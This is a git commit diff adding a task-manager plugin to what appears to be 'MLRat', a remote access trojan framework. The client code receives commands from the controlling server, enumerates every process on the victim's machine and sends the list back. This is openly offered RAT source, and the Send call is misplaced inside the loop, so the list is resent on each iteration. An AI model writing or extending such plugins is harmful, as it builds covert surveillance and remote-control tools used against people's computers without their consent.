c91102c69a5e244f966ebfcd25a778525caf09e7
BahNahNah <sam.mackenzie@live.com>
2015-08-28 22:37:33 +1200

    Started on MLManagement

---
+++ CorePlugins/MLManagement/MLManagementClient/ClientPlugin.cs
@@ -0,0 +1,37 @@
+﻿using MLManagementClient.Handlers;
+using MLRat.Client;
+using SharedCode.Network;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+
+namespace MLManagementClient
+{
+    public class ClientPlugin : IClientPlugin
+    {
+        public void OnConnect()
+        {
+            
+        }
+
+        public void OnDataRecieved(object[] data)
+        {
+            NetworkCommand command = (NetworkCommand)data[0];
+
+            if (command == NetworkCommand.TaskManager) TaskManagerHandler.Handle(data);
+
+
+        }
+
+        public void OnDisconnect()
+        {
+            
+        }
+
+        public void OnPluginLoad(IClientConnection server)
+        {
+            TaskManagerHandler.SetNetworkHost(server);
+        }
+    }
+}
---
+++ CorePlugins/MLManagement/MLManagementClient/Handlers/TaskManagerHandler.cs
@@ -0,0 +1,48 @@
+﻿using MLRat.Client;
+using SharedCode.CustomObjects;
+using SharedCode.Network;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Text;
+
+namespace MLManagementClient.Handlers
+{
+    public static class TaskManagerHandler
+    {
+        static IClientConnection NetworkHost = null;
+        public static void SetNetworkHost(IClientConnection connection)
+        {
+            NetworkHost = connection;
+        }
+
+        public static void Handle(object[] data)
+        {
+            TaskManagerCommand command = (TaskManagerCommand)data[1];
+
+            if (command == TaskManagerCommand.GetProcesses) GetProcesses();
+
+        }
+
+        public static void GetProcesses()
+        {
+            List<TrimProcess> procs = new List<TrimProcess>();
+            foreach(Process p in Process.GetProcesses())
+            {
+                try
+                {
+                    TrimProcess tp = new TrimProcess();
+                    tp.ID = p.Id;
+                    tp.Name = p.ProcessName;
+                    procs.Add(tp);
+                }
+                catch
+                {
+
+                }
+                NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.ProcessList, procs.ToArray());
+            }
+        }
+    }
+}
